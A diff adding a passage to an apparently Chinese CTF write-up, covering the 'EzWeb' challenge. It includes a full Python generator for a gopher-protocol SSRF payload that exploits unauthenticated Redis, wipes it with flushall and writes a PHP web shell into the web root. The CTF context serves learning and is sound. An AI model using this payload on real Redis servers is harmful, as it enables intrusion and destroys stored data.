@@ -180,6 +180,61 @@ req = requests.post("http://67f6b840-8d56-441f-87ad-95fe0da057b3.node3.buuoj.cn/
 print req.text
 ```
 
+## 0x05 EzWeb
+
+F12源码提示了``?secret``
+
+可以拿到靶机的内网地址
+
+应该是想办法内网渗透
+
+会的东西太少了，思路比较狭窄or2
+
+看了wp发现是考察redis未授权访问getshell
+
+就是还可以访问到另一台开着redis服务的机子存在未授权访问漏洞
+
+直接利用``gopher``协议写shell拿到flag
+
+payload 生成
+
+```python
+import urllib
+protocol="gopher://"
+ip=""#填redis服务机的ip
+port="6379"
+shell="\n\n<?php system(\"cat /flag\");?>\n\n"
+filename="eki.php"
+path="/var/www/html"
+passwd=""
+cmd=[
+    "flushall",
+    "set 1 {}".format(shell.replace(" ","${IFS}")),
+    "config set dir {}".format(path),
+    "config set dbfilename {}".format(filename),
+    "save"
+    ]
+if passwd:
+    cmd.insert(0,"AUTH {}".format(passwd))
+payload=protocol+ip+":"+port+"/_"
+def redis_format(arr):
+    CRLF="\r\n"
+    redis_arr = arr.split(" ")
+    cmd=""
+    cmd+="*"+str(len(redis_arr))
+    for x in redis_arr:
+        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ") 
+    cmd+=CRLF
+    return cmd
+
+if __name__=="__main__":
+    for x in cmd:
+        payload += urllib.quote(redis_format(x))
+    print payload
+```
+
+打完就可以访问对应ip下的``/eki.php``获得flag
+
 ## 0x06 EzTypecho
 
 看源码好像没啥修改，似乎typecho的反序列化exp还能用
